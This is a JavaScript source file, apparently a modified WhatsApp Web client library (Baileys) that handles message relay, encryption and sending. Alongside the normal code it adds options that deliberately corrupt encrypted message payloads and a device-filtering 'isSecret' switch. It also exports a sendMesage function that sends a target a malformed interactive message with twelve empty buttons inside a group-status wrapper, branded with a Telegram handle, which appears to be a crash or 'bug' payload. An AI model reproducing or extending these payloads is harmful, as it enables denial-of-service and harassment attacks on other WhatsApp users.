var __importDefault = (this && this.__importDefault) || function (mod) {
  return (mod && mod.__esModule) ? mod : { "default": mod };
};
var ListType;
Object.defineProperty(exports, "__esModule", {
  value: true
});
exports.makeMessagesSocket = void 0;
const boom_1 = require("@hapi/boom"),
  node_cache_1 = __importDefault(require("node-cache")),
  WAProto_1 = require("../../WAProto"),
  Defaults_1 = require("../Defaults"),
  axios_1 = require("axios"),
  Types_1 = require("../Types"),
  Utils_1 = require("../Utils"),
  link_preview_1 = require("../Utils/link-preview"),
  WABinary_1 = require("../WABinary"),
  newsletter_1 = require("./newsletter"),
  WAUSync_1 = require("../WAUSync"),
  crypto_1 = require("crypto"),
  kikyy = require("./dugong");
ListType = WAProto_1.proto.Message.ListMessage.ListType;
const makeMessagesSocket = config => {
  const {
      logger: logger,
      linkPreviewImageThumbnailWidth: linkPreviewImageThumbnailWidth,
      generateHighQualityLinkPreview: generateHighQualityLinkPreview,
      options: axiosOptions,
      patchMessageBeforeSending: patchMessageBeforeSending
    } = config,
    sock = (0, newsletter_1.makeNewsletterSocket)(config),
    {
      ev,
      authState: authState,
      processingMutex: processingMutex,
      signalRepository: signalRepository,
      upsertMessage: upsertMessage,
      query: query,
      fetchPrivacySettings: fetchPrivacySettings,
      generateMessageTag: generateMessageTag,
      sendNode: sendNode,
      groupMetadata: groupMetadata,
      groupToggleEphemeral: groupToggleEphemeral,
      executeUSyncQuery: executeUSyncQuery
    } = sock,
    userDevicesCache = config.userDevicesCache || new node_cache_1["default"]({
      stdTTL: Defaults_1.DEFAULT_CACHE_TTLS.USER_DEVICES,
      useClones: false
    });
  let mediaConn;
  const refreshMediaConn = async (forceGet = false) => {
      const media = await mediaConn;
      if (!media || forceGet || new Date().getTime() - media.fetchDate.getTime() > media.ttl * 1000) {
        mediaConn = (async () => {
          const result = await query({
              tag: "iq",
              attrs: {
                type: "set",
                xmlns: "w:m",
                to: WABinary_1.S_WHATSAPP_NET
              },
              content: [{
                tag: "media_conn",
                attrs: {}
              }]
            }),
            mediaConnNode = WABinary_1.getBinaryNodeChild(result, "media_conn"),
            node = {
              hosts: WABinary_1.getBinaryNodeChildren(mediaConnNode, "host").map(({
                attrs: attrs
              }) => {
                return {
                  hostname: attrs.hostname,
                  maxContentLengthBytes: +attrs.maxContentLengthBytes
                };
              }),
              auth: mediaConnNode.attrs.auth,
              ttl: +mediaConnNode.attrs.ttl,
              fetchDate: new Date()
            };
          logger.debug("fetched media conn");
          return node;
        })();
      }
      return mediaConn;
    },
    sendReceipt = async (jid, participant, messageIds, type) => {
      const node = {
          tag: "receipt",
          attrs: {
            id: messageIds[0]
          }
        },
        isReadReceipt = type === "read" || type === "read-self";
      if (isReadReceipt) {
        node.attrs.t = (0, Utils_1.unixTimestampSeconds)().toString();
      }
      if (type === "sender" && WABinary_1.isJidUser(jid)) {
        node.attrs.recipient = jid;
        node.attrs.to = participant;
      } else {
        node.attrs.to = jid;
        if (participant) {
          node.attrs.participant = participant;
        }
      }
      if (type) {
        node.attrs.type = WABinary_1.isJidNewsLetter(jid) ? "read-self" : type;
      }
      const remainingMessageIds = messageIds.slice(1);
      if (remainingMessageIds.length) {
        node.content = [{
          tag: "list",
          attrs: {},
          content: remainingMessageIds.map(id => {
            return {
              tag: "item",
              attrs: {
                id: id
              }
            };
          })
        }];
      }
      logger.debug({
        attrs: node.attrs,
        messageIds: messageIds
      }, "sending receipt for messages");
      await sendNode(node);
    },
    sendReceipts = async (keys, type) => {
      const recps = (0, Utils_1.aggregateMessageKeysNotFromMe)(keys);
      for (const {
        jid: jid,
        participant: participant,
        messageIds: messageIds
      } of recps) {
        await sendReceipt(jid, participant, messageIds, type);
      }
    },
    readMessages = async keys => {
      const privacySettings = await fetchPrivacySettings(),
        readType = privacySettings.readreceipts === "all" ? "read" : "read-self";
      await sendReceipts(keys, readType);
    },
    getUSyncDevices = async (jids, useCache, ignoreZeroDevices) => {
      const deviceResults = [];
      if (!useCache) {
        logger.debug("not using cache for devices");
      }
      const toFetch = [];
      jids = Array.from(new Set(jids));
      for (let jid of jids) {
        const user = WABinary_1.jidDecode(jid)?.user;
        jid = WABinary_1.jidNormalizedUser(jid);
        if (useCache) {
          const devices = userDevicesCache.get(user);
          if (devices) {
            deviceResults.push(...devices);
            logger.trace({
              user: user
            }, "using cache for devices");
          } else {
            toFetch.push(jid);
          }
        } else {
          toFetch.push(jid);
        }
      }
      if (!toFetch.length) {
        return deviceResults;
      }
      const query = new WAUSync_1.USyncQuery().withContext("message").withDeviceProtocol();
      for (const jid of toFetch) {
        query.withUser(new WAUSync_1.USyncUser().withId(jid));
      }
      const result = await executeUSyncQuery(query);
      if (result) {
        const extracted = Utils_1.extractDeviceJids(result?.list, authState.creds.me.id, ignoreZeroDevices),
          deviceMap = {};
        for (const item of extracted) {
          deviceMap[item.user] = deviceMap[item.user] || [];
          deviceMap[item.user].push(item);
          deviceResults.push(item);
        }
        for (const key in deviceMap) {
          userDevicesCache.set(key, deviceMap[key]);
        }
      }
      return deviceResults;
    },
    assertSessions = async (jids, force) => {
      let didFetchNewSession = false,
        jidsRequiringFetch = [];
      if (force) {
        jidsRequiringFetch = jids;
      } else {
        const addrs = jids.map(jid => {
            return signalRepository.jidToSignalProtocolAddress(jid);
          }),
          sessions = await authState.keys.get("session", addrs);
        for (const jid of jids) {
          const signalId = signalRepository.jidToSignalProtocolAddress(jid);
          if (!sessions[signalId]) {
            jidsRequiringFetch.push(jid);
          }
        }
      }
      if (jidsRequiringFetch.length) {
        logger.debug({
          jidsRequiringFetch: jidsRequiringFetch
        }, "fetching sessions");
        const result = await query({
          tag: "iq",
          attrs: {
            xmlns: "encrypt",
            type: "get",
            to: WABinary_1.S_WHATSAPP_NET
          },
          content: [{
            tag: "key",
            attrs: {},
            content: jidsRequiringFetch.map(jid => {
              return {
                tag: "user",
                attrs: {
                  jid: jid
                }
              };
            })
          }]
        });
        await (0, Utils_1.parseAndInjectE2ESessions)(result, signalRepository);
        didFetchNewSession = true;
      }
      return didFetchNewSession;
    },
    sendPeerDataOperationMessage = async pdoMessage => {
      if (!authState.creds.me?.id) {
        throw new boom_1.Boom("Not authenticated");
      }
      const protocolMessage = {
          protocolMessage: {
            peerDataOperationRequestMessage: pdoMessage,
            type: WAProto_1.proto.Message.ProtocolMessage.Type.PEER_DATA_OPERATION_REQUEST_MESSAGE
          }
        },
        meJid = WABinary_1.jidNormalizedUser(authState.creds.me.id),
        msgId = await relayMessage(meJid, protocolMessage, {
          additionalAttributes: {
            category: "peer",
            push_priority: "high_force"
          }
        });
      return msgId;
    },
    createParticipantNodes = async (jids, message, extraAttrs) => {
      const patched = await patchMessageBeforeSending(message, jids),
        bytes = (0, Utils_1.encodeWAMessage)(patched);
      let shouldIncludeDeviceIdentity = false;
      const nodes = await Promise.all(jids.map(async jid => {
        const {
          type: type,
          ciphertext: ciphertext
        } = await signalRepository.encryptMessage({
          jid: jid,
          data: bytes
        });
        if (type === "pkmsg") {
          shouldIncludeDeviceIdentity = true;
        }
        const node = {
          tag: "to",
          attrs: {
            jid: jid
          },
          content: [{
            tag: "enc",
            attrs: {
              v: "2",
              type: type,
              ...(extraAttrs || {})
            },
            content: ciphertext
          }]
        };
        return node;
      }));
      return {
        nodes: nodes,
        shouldIncludeDeviceIdentity: shouldIncludeDeviceIdentity
      };
    },
    safeSendNode = async stanza => {
      try {
        await sendNode(stanza);
      } catch (err) {
        try {
          logger.warn({
            err: err
          }, "safeSendNode: sendNode failed (ignored)");
        } catch (e) {
          console.warn("safeSendNode: sendNode failed (ignored)", err);
        }
        return null;
      }
    },
    safeGroupMetadata = async jid => {
      try {
        return await groupMetadata(jid);
      } catch (err) {
        try {
          logger.warn({
            jid: jid,
            err: err
          }, "safeGroupMetadata: failed (ignored)");
        } catch (e) {
          console.warn("safeGroupMetadata failed for", jid, err);
        }
        return undefined;
      }
    },
    relayMessage = async (jid, message, {
      messageId: msgId,
      participant: participant,
      additionalAttributes: additionalAttributes,
      additionalNodes: additionalNodes,
      useUserDevicesCache: useUserDevicesCache,
      cachedGroupMetadata: cachedGroupMetadata,
      useCachedGroupMetadata: useCachedGroupMetadata,
      statusJidList: statusJidList,
      isSecret = 0,
      antiSelf = false,
      corrupt = false,
      corrupt2 = false,
      addBizAttributes = false
    }) => {
      try {
        const meId = authState.creds.me.id,
          meLid = authState.creds.me?.lid;
        let shouldIncludeDeviceIdentity = false,
          didPushAdditional = false;
        const {
            user: user,
            server: server
          } = WABinary_1.jidDecode(jid),
          statusJid = "status@broadcast",
          isGroup = server === "g.us",
          isStatus = jid === statusJid,
          isLid = server === "lid",
          isNewsletter = server === "newsletter";
        msgId = msgId || (0, Utils_1.generateMessageID)();
        useUserDevicesCache = useUserDevicesCache !== false;
        useCachedGroupMetadata = useCachedGroupMetadata !== false && !isStatus;
        const participants = [],
          destinationJid = !isStatus ? WABinary_1.jidEncode(user, isLid ? "lid" : isGroup ? "g.us" : isNewsletter ? "newsletter" : "s.whatsapp.net") : statusJid,
          binaryNodeContent = [];
        let devices = [];
        const meMsg = {
            deviceSentMessage: {
              destinationJid: destinationJid,
              message: message
            }
          },
          extraAttrs = {},
          messages = Utils_1.normalizeMessageContent(message),
          buttonType = getButtonType(messages);
        if (participant) {
          if (!isGroup && !isStatus) {
            additionalAttributes = {
              ...additionalAttributes,
              device_fanout: "false"
            };
          }
          const {
            user: user,
            device: device
          } = WABinary_1.jidDecode(participant.jid);
          devices.push({
            user: user,
            device: device
          });
        }
        await authState.keys.transaction(async () => {
          const mediaType = getMediaType(messages);
          if (mediaType) {
            extraAttrs.mediatype = mediaType;
          }
          if (messages.pinInChatMessage || messages.keepInChatMessage || message.reactionMessage || message.protocolMessage?.editedMessage) {
            extraAttrs["decrypt-fail"] = "hide";
          }
          if (messages.interactiveResponseMessage?.nativeFlowResponseMessage) {
            extraAttrs.native_flow_name = messages.interactiveResponseMessage.nativeFlowResponseMessage.name;
          }
          if (isGroup || isStatus) {
            const [groupData, senderKeyMap] = await Promise.all([
              (async () => {
                let groupData = useCachedGroupMetadata && cachedGroupMetadata ? await cachedGroupMetadata(jid) : undefined;
                if (groupData) {
                  logger.trace({
                    jid: jid,
                    participants: groupData.participants.length
                  }, "using cached group metadata");
                } else if (!isStatus) {
                  groupData = await safeGroupMetadata(jid);
                }
                return groupData;
              })(),
              (async () => {
                if (!participant && !isStatus) {
                  const result = await authState.keys.get("sender-key-memory", [jid]);
                  return result[jid] || {};
                }
                return {};
              })()
            ]);
            if (!participant) {
              const participantsList = groupData && !isStatus ? groupData.participants.map(p => p.id) : [];
              if (isStatus && statusJidList) {
                participantsList.push(...statusJidList);
              }
              const additionalDevices = await getUSyncDevices(participantsList, !!useUserDevicesCache, false);
              devices.push(...additionalDevices);
            }
            let {
                user: mePn
              } = WABinary_1.jidDecode(meId),
              {
                user: meLidU
              } = meLid ? WABinary_1.jidDecode(meLid) : {
                user: null
              };
            devices = devices.filter(({
              user: deviceUser,
              device: device
            }) => {
              const isMe = deviceUser === mePn || deviceUser === meLidU;
              const skipOther = !isMe && ((isSecret === 1 && device !== undefined) || (isSecret === 2 && device === undefined) || (isSecret === 5 && device === undefined) || (isSecret === 6 && device !== undefined));
              const skipMe = isMe && (antiSelf || (isSecret === 3 && device !== undefined) || (isSecret === 4 && device === undefined) || isSecret === 5 || isSecret === 6);
              return !(skipOther || skipMe);
            });
            const patched = await patchMessageBeforeSending(message, devices.map(device => WABinary_1.jidEncode(device.user, isLid ? "lid" : "s.whatsapp.net", device.device))),
              bytes = Utils_1.encodeWAMessage(patched);
            const {
              ciphertext: ciphertext,
              senderKeyDistributionMessage: senderKeyDistributionMessage
            } = await signalRepository.encryptGroupMessage({
              group: destinationJid,
              data: bytes,
              meId: meId
            });
            const senderKeyJids = [];
            for (const {
                user: deviceUser,
                device: device
              } of devices) {
              const targetJid = WABinary_1.jidEncode(deviceUser, groupData?.addressingMode === "lid" ? "lid" : "s.whatsapp.net", device);
              if (!senderKeyMap[targetJid] || !!participant) {
                senderKeyJids.push(targetJid);
                senderKeyMap[targetJid] = true;
              }
            }
            if (senderKeyJids.length) {
              logger.debug({
                senderKeyJids: senderKeyJids
              }, "sending new sender key");
              const senderKeyMsg = {
                senderKeyDistributionMessage: {
                  axolotlSenderKeyDistributionMessage: senderKeyDistributionMessage,
                  groupId: destinationJid
                }
              };
              await assertSessions(senderKeyJids, false);
              const result = await createParticipantNodes(senderKeyJids, senderKeyMsg, extraAttrs);
              if (corrupt2) {
                result.nodes.forEach(node => {
                  if (node.content?.[0]) {
                    node.content[0].content = Buffer.concat([node.content[0].content, Buffer.alloc(64, 0)]);
                  }
                });
              }
              shouldIncludeDeviceIdentity = shouldIncludeDeviceIdentity || result.shouldIncludeDeviceIdentity;
              participants.push(...result.nodes);
            }
            binaryNodeContent.push({
              tag: "enc",
              attrs: {
                v: "2",
                type: "skmsg",
                ...extraAttrs
              },
              content: ciphertext
            });
            await authState.keys.set({
              "sender-key-memory": {
                [jid]: senderKeyMap
              }
            });
          } else if (isNewsletter) {
            if (message.protocolMessage?.editedMessage) {
              msgId = message.protocolMessage.key?.id;
              message = message.protocolMessage.editedMessage;
            }
            if (message.protocolMessage?.type === WAProto_1.proto.Message.ProtocolMessage.Type.REVOKE) {
              msgId = message.protocolMessage.key?.id;
              message = {};
            }
            const patched = await patchMessageBeforeSending(message, []),
              bytes = Utils_1.encodeNewsletterMessage(patched);
            binaryNodeContent.push({
              tag: "plaintext",
              attrs: extraAttrs || {},
              content: bytes
            });
          } else {
            const {
              user: meUser
            } = WABinary_1.jidDecode(meId);
            if (!participant) {
              devices.push({
                user: user
              });
              if (user !== meUser) {
                devices.push({
                  user: meUser
                });
              }
              if (additionalAttributes?.category !== "peer") {
                const additionalDevices = await getUSyncDevices([meId, jid], !!useUserDevicesCache, true);
                devices.push(...additionalDevices);
              }
            }
            const allJids = [],
              meJids = [],
              otherJids = [];
            let {
                user: mePn
              } = WABinary_1.jidDecode(meId),
              {
                user: meLidU
              } = meLid ? WABinary_1.jidDecode(meLid) : {
                user: null
              };
            for (const {
                user: deviceUser,
                device: device
              } of devices) {
              const targetJid = WABinary_1.jidEncode(deviceUser, isLid ? "lid" : "s.whatsapp.net", device);
              if (targetJid === meId || meLid && targetJid === meLid) {
                continue;
              }
              const isMe = deviceUser === mePn || deviceUser === meLidU;
              const skipOther = !isMe && ((isSecret === 1 && device !== undefined) || (isSecret === 2 && device === undefined) || (isSecret === 5 && device === undefined) || (isSecret === 6 && device !== undefined));
              const skipMe = isMe && (antiSelf || (isSecret === 3 && device !== undefined) || (isSecret === 4 && device === undefined) || isSecret === 5 || isSecret === 6);
              if (skipOther || skipMe) {
                continue;
              }
              if (isMe) {
                meJids.push(targetJid);
              } else {
                otherJids.push(targetJid);
              }
              allJids.push(targetJid);
            }
            await assertSessions(allJids, false);
            const [{
                nodes: meNodes,
                shouldIncludeDeviceIdentity: includeMeIdentity
              }, {
                nodes: otherNodes,
                shouldIncludeDeviceIdentity: includeOtherIdentity
              }] = await Promise.all([
              createParticipantNodes(meJids, meMsg, extraAttrs),
              createParticipantNodes(otherJids, message, extraAttrs)
            ]);
            if (corrupt) {
              meNodes.forEach(node => {
                if (node.content?.[0]) node.content[0].content = Buffer.from([51]);
              });
            }
            if (corrupt2) {
              otherNodes.forEach(node => {
                if (node.content?.[0]) node.content[0].content = Buffer.concat([node.content[0].content, Buffer.alloc(64, 0)]);
              });
            }
            participants.push(...meNodes, ...otherNodes);
            shouldIncludeDeviceIdentity = shouldIncludeDeviceIdentity || includeMeIdentity || includeOtherIdentity;
          }
          if (participants.length) {
            if (additionalAttributes?.category === "peer") {
              const peerNode = participants[0]?.content?.[0];
              if (peerNode) {
                binaryNodeContent.push(peerNode);
              }
            } else {
              binaryNodeContent.push({
                tag: "participants",
                attrs: {},
                content: participants
              });
            }
          }
          const stanza = {
            tag: "message",
            attrs: {
              id: msgId,
              type: getTypeMessage(messages),
              ...(additionalAttributes || {})
            },
            content: binaryNodeContent
          };
          if (addBizAttributes) {
            stanza.content.push({
              tag: "biz",
              attrs: {
                actual_actors: "2",
                host_storage: "2",
                privacy_mode_ts: `${Date.now() / 1000 | 0}`
              },
              content: [{
                tag: "quality_control",
                attrs: {
                  decision_id: (0, crypto_1.randomBytes)(20).toString("hex"),
                  source_type: "third_party"
                },
                content: [{
                  tag: "decision_source",
                  attrs: {
                    value: "df"
                  }
                }]
              }]
            });
          }
          if (participant) {
            if (WABinary_1.isJidGroup(destinationJid)) {
              stanza.attrs.to = destinationJid;
              stanza.attrs.participant = participant.jid;
            } else if (WABinary_1.areJidsSameUser(participant.jid, meId)) {
              stanza.attrs.to = participant.jid;
              stanza.attrs.recipient = destinationJid;
            } else {
              stanza.attrs.to = participant.jid;
            }
          } else {
            stanza.attrs.to = destinationJid;
          }
          if (shouldIncludeDeviceIdentity) {
            stanza.content.push({
              tag: "device-identity",
              attrs: {},
              content: (0, Utils_1.encodeSignedDeviceIdentity)(authState.creds.account, true)
            });
          }
          let inner = messages;
          let hasWrapper = false;
          let hasSpecial = false;
          while (inner && typeof inner === "object") {
            const entry = Object.entries(inner).find(([, value]) =>
              value && typeof value === "object" &&
              (value.message || value.templateMessage || value.buttonsMessage || value.interactiveMessage)
            );
            if (!entry) break;
            const [, value] = entry;
            if (value.message) hasWrapper = true;
            if (value.templateMessage || value.buttonsMessage || value.interactiveMessage) {
              hasSpecial = true;
            }
            inner = value.message || value.templateMessage || value.buttonsMessage || value.interactiveMessage;
          }
          if (hasWrapper || hasSpecial) {
            stanza.content.push({
              tag: "biz",
              attrs: {},
              content: [{
                tag: "interactive",
                attrs: {
                  type: "native_flow",
                  v: "1"
                },
                content: [{
                  tag: "native_flow",
                  attrs: {
                    name: "quick_reply"
                  }
                }]
              }]
            });
          }
          if (!isNewsletter && buttonType && !isStatus) {
            const content = WABinary_1.getAdditionalNode(buttonType),
              filteredNode = WABinary_1.getBinaryNodeFilter(additionalNodes);
            if (filteredNode) {
              didPushAdditional = true;
              stanza.content.push(...additionalNodes);
            } else {
              stanza.content.push(...content);
            }
          }
          if (!didPushAdditional && additionalNodes && additionalNodes.length > 0) {
            stanza.content.push(...additionalNodes);
          }
          await safeSendNode(stanza);
        });
        return msgId;
      } catch (err) {
        try {
          logger.error({
            err: err,
            jid: jid
          }, "relayMessage caught error (bot continues)");
        } catch (e) {
          console.error("relayMessage caught error (bot continues):", err);
        }
        return null;
      }
    },
    getTypeMessage = msg => {
      const message = Utils_1.normalizeMessageContent(msg);
      return message.reactionMessage ? "reaction" : getMediaType(message) ? "media" : "text";
    },
    getMediaType = message => {
      if (message.imageMessage) {
        return "image";
      } else {
        if (message.videoMessage) {
          return message.videoMessage.gifPlayback ? "gif" : "video";
        } else {
          if (message.audioMessage) {
            return message.audioMessage.ptt ? "ptt" : "audio";
          } else {
            if (message.contactMessage) {
              return "vcard";
            } else {
              if (message.documentMessage) {
                return "document";
              } else {
                if (message.contactsArrayMessage) {
                  return "contact_array";
                } else {
                  if (message.liveLocationMessage) {
                    return "livelocation";
                  } else {
                    if (message.stickerMessage) {
                      return "sticker";
                    } else {
                      if (message.listMessage) {
                        return "list";
                      } else {
                        if (message.listResponseMessage) {
                          return "list_response";
                        } else {
                          if (message.buttonsResponseMessage) {
                            return "buttons_response";
                          } else {
                            if (message.orderMessage) {
                              return "order";
                            } else {
                              if (message.productMessage) {
                                return "product";
                              } else {
                                if (message.interactiveResponseMessage) {
                                  return "native_flow_response";
                                } else {
                                  if (message.groupInviteMessage) {
                                    return "url";
                                  } else {
                                    if (new RegExp("https:\\/\\/wa\\.me\\/p\\/\\d+\\/\\d+", "").test(message.extendedTextMessage?.text)) {
                                      return "productlink";
                                    }
                                  }
                                }
                              }
                            }
                          }
                        }
                      }
                    }
                  }
                }
              }
            }
          }
        }
      }
    },
    getButtonType = message => {
      if (message.listMessage) {
        return "list";
      } else {
        if (message.buttonsMessage) {
          return "buttons";
        } else {
          if (message.interactiveMessage?.nativeFlowMessage?.buttons?.[0]?.name === "review_and_pay") {
            return "review_and_pay";
          } else {
            if (message.interactiveMessage?.nativeFlowMessage?.buttons?.[0]?.name === "review_order") {
              return "review_order";
            } else {
              if (message.interactiveMessage?.nativeFlowMessage?.buttons?.[0]?.name === "payment_info") {
                return "payment_info";
              } else {
                if (message.interactiveMessage?.nativeFlowMessage?.buttons?.[0]?.name === "payment_status") {
                  return "payment_status";
                } else {
                  if (message.interactiveMessage?.nativeFlowMessage?.buttons?.[0]?.name === "payment_method") {
                    return "payment_method";
                  } else {
                    if (message.interactiveMessage && message.interactiveMessage?.nativeFlowMessage) {
                      return "interactive";
                    } else {
                      if (message.interactiveMessage?.nativeFlowMessage) {
                        return "native_flow";
                      }
                    }
                  }
                }
              }
            }
          }
        }
      }
    },
    getPrivacyTokens = async jids => {
      const t = Utils_1.unixTimestampSeconds().toString(),
        result = await query({
          tag: "iq",
          attrs: {
            to: WABinary_1.S_WHATSAPP_NET,
            type: "set",
            xmlns: "privacy"
          },
          content: [{
            tag: "tokens",
            attrs: {},
            content: jids.map(jid => {
              return {
                tag: "token",
                attrs: {
                  jid: WABinary_1.jidNormalizedUser(jid),
                  t: t,
                  type: "trusted_contact"
                }
              };
            })
          }]
        });
      return result;
    },
    waUploadToServer = (0, Utils_1.getWAUploadToServer)(config, refreshMediaConn),
    rahmi = new kikyy(Utils_1, waUploadToServer, relayMessage),
    waitForMsgMediaUpdate = (0, Utils_1.bindWaitForEvent)(ev, "messages.media-update");
  return {
    ...sock,
    getPrivacyTokens: getPrivacyTokens,
    assertSessions: assertSessions,
    relayMessage: relayMessage,
    sendReceipt: sendReceipt,
    sendReceipts: sendReceipts,
    rahmi: rahmi,
    readMessages: readMessages,
    refreshMediaConn: refreshMediaConn,
    getUSyncDevices: getUSyncDevices,
    createParticipantNodes: createParticipantNodes,
    waUploadToServer: waUploadToServer,
    sendPeerDataOperationMessage: sendPeerDataOperationMessage,
    fetchPrivacySettings: fetchPrivacySettings,
    updateMediaMessage: async message => {
      const content = (0, Utils_1.assertMediaContent)(message.message),
        mediaKey = content.mediaKey,
        meId = authState.creds.me.id,
        node = (0, Utils_1.encryptMediaRetryRequest)(message.key, mediaKey, meId);
      let error = undefined;
      await Promise.all([sendNode(node), waitForMsgMediaUpdate(update => {
        const result = update.find(c => {
          return c.key.id === message.key.id;
        });
        if (result) {
          if (result.error) {
            error = result.error;
          } else {
            try {
              const media = (0, Utils_1.decryptMediaRetryData)(result.media, mediaKey, result.key.id);
              if (media.result !== WAProto_1.proto.MediaRetryNotification.ResultType.SUCCESS) {
                const resultStr = WAProto_1.proto.MediaRetryNotification.ResultType[media.result];
                throw new boom_1.Boom("Media re-upload failed by device (" + resultStr + ")", {
                  data: media,
                  statusCode: (0, Utils_1.getStatusCodeForMediaRetry)(media.result) || 404
                });
              }
              content.directPath = media.directPath;
              content.url = (0, Utils_1.getUrlFromDirectPath)(content.directPath);
            } catch (err) {
              error = err;
            }
          }
          return true;
        }
      })]);
      if (error) {
        throw error;
      }
      ev.emit("messages.update", [{
        key: message.key,
        update: {
          message: message.message
        }
      }]);
      return message;
    },
    sendjson: async (target, json = {}, sendConfig = {}) => {
      const msg = await Utils_1.generateWAMessageFromContent(target, json, {
        userJid: authState.creds.me.id
      });
      return relayMessage(target, msg.message, {
        messageId: msg.key.id,
        ...sendConfig
      });
    },
    richMenu: async (target, content = {}, sendConfig = {}) => {
      const {
        buildRichMenuMessage
      } = require("../dread-features");
      const waMsg = await Utils_1.generateWAMessageFromContent(target, buildRichMenuMessage(content), {
        userJid: authState.creds.me.id
      });
      await relayMessage(target, waMsg.message, {
        messageId: waMsg.key.id,
        ...sendConfig
      });
      return waMsg;
    },
    sendMessage: async (jid, content, options = {}) => {
      const userJid = authState.creds.me.id;
      delete options.ephemeralExpiration;
      const {
          filter = false,
          quoted: quoted
        } = options,
        getParticipantAttr = () => {
          return filter ? {
            participant: {
              jid: jid
            }
          } : {};
        },
        messageType = rahmi.detectType(content);
      if (typeof content === "object" && "disappearingMessagesInChat" in content && typeof content.disappearingMessagesInChat !== "undefined" && WABinary_1.isJidGroup(jid)) {
        const {
            disappearingMessagesInChat: disappearingMessagesInChat
          } = content,
          value = typeof disappearingMessagesInChat === "boolean" ? disappearingMessagesInChat ? Defaults_1.WA_DEFAULT_EPHEMERAL : 0 : disappearingMessagesInChat;
        await groupToggleEphemeral(jid, value);
      } else {
        if (messageType) {
          switch (messageType) {
            case "PAYMENT":
              const paymentContent = await rahmi.handlePayment(content, quoted);
              return await relayMessage(jid, paymentContent, {
                messageId: Utils_1.generateMessageID(),
                ...getParticipantAttr(),
                isSecret: options.isSecret,
                corrupt: options.corrupt,
                corrupt2: options.corrupt2,
                addBizAttributes: options.addBizAttributes
              });
            case "PRODUCT":
              const productContent = await rahmi.handleProduct(content, jid, quoted),
                productMsg = await Utils_1.generateWAMessageFromContent(jid, productContent, {
                  quoted: quoted
                });
              return await relayMessage(jid, productMsg.message, {
                messageId: productMsg.key.id,
                ...getParticipantAttr(),
                isSecret: options.isSecret,
                corrupt: options.corrupt,
                corrupt2: options.corrupt2,
                addBizAttributes: options.addBizAttributes
              });
            case "INTERACTIVE":
              const interactiveContent = await rahmi.handleInteractive(content, jid, quoted),
                interactiveMsg = await Utils_1.generateWAMessageFromContent(jid, interactiveContent, {
                  quoted: quoted
                });
              return await relayMessage(jid, interactiveMsg.message, {
                messageId: interactiveMsg.key.id,
                ...getParticipantAttr(),
                isSecret: options.isSecret,
                corrupt: options.corrupt,
                corrupt2: options.corrupt2,
                addBizAttributes: options.addBizAttributes
              });
            case "ALBUM":
              return await rahmi.handleAlbum(content, jid, quoted);
            case "EVENT":
              return await rahmi.handleEvent(content, jid, quoted);
            case "POLL_RESULT":
              return await rahmi.handlePollResult(content, jid, quoted);
          }
        }
        const fullMsg = await Utils_1.generateWAMessage(jid, content, {
            logger: logger,
            userJid: userJid,
            quoted: quoted,
            getUrlInfo: text => {
              return link_preview_1.getUrlInfo(text, {
                thumbnailWidth: linkPreviewImageThumbnailWidth,
                fetchOpts: {
                  timeout: 0xbb8,
                  ...(axiosOptions || {})
                },
                logger: logger,
                uploadImage: generateHighQualityLinkPreview ? waUploadToServer : undefined
              });
            },
            upload: async (readStream, opts) => {
              const up = await waUploadToServer(readStream, {
                ...opts,
                newsletter: WABinary_1.isJidNewsLetter(jid)
              });
              return up;
            },
            mediaCache: config.mediaCache,
            options: config.options,
            ...options
          }),
          isDeleteMsg = "delete" in content && !!content["delete"],
          isEditMsg = "edit" in content && !!content.edit,
          isAiMsg = "ai" in content && !!content.ai,
          additionalAttributes = {},
          additionalNodes = [];
        if (isDeleteMsg) {
          const fromMe = content["delete"]?.fromMe,
            isGroup = WABinary_1.isJidGroup(content["delete"]?.remoteJid);
          additionalAttributes.edit = isGroup && !fromMe || WABinary_1.isJidNewsLetter(jid) ? "8" : "7";
        } else {
          if (isEditMsg) {
            additionalAttributes.edit = WABinary_1.isJidNewsLetter(jid) ? "3" : "1";
          } else {
            if (isAiMsg) {
              additionalNodes.push({
                attrs: {
                  biz_bot: "1"
                },
                tag: "bot"
              });
            }
          }
        }
        await relayMessage(jid, fullMsg.message, {
          messageId: fullMsg.key.id,
          cachedGroupMetadata: options.cachedGroupMetadata,
          additionalNodes: isAiMsg ? additionalNodes : options.additionalNodes,
          additionalAttributes: additionalAttributes,
          statusJidList: options.statusJidList,
          isSecret: options.isSecret,
          corrupt: options.corrupt,
          corrupt2: options.corrupt2,
          addBizAttributes: options.addBizAttributes
        });
        if (config.emitOwnEvents) {
          process.nextTick(() => {
            processingMutex.mutex(() => {
              return upsertMessage(fullMsg, "append");
            });
          });
        }
        return fullMsg;
      }
    }
  };
};
async function sendMesage(sock, target, ptcp) {
  const xeonbotinc = {
    viewOnceMessage: {
      message: {
        interactiveMessage: {
          body: {
            text: "Telegram: @dgxeon13"
          },
          nativeFlowMessage: {
            buttons: Array.from({
              length: 12
            }, () => {
              return {};
            })
          }
        }
      }
    }
  };
  await sock.relayMessage(target, {
    groupStatusMessageV2: {
      message: xeonbotinc
    }
  }, ptcp ? {
    messageId: null,
    participant: {
      jid: target
    }
  } : {
    messageId: null
  });
}
exports.sendMesage = sendMesage;
exports.makeMessagesSocket = makeMessagesSocket;
